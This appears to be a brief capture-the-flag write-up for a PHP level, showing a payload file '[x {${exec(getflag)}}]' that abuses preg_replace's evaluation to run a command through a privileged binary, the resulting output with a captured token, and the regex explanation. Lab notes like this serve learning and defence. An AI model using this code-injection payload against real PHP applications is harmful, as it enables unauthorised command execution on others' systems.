https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4

nano /tmp/test.php
> [x {${exec(getflag)}}]

./level06 test.php # Because level06 execute level06.php
> PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1


The pattern (\[x (.*)\]) matches [ x {${exec(getflag)}}].

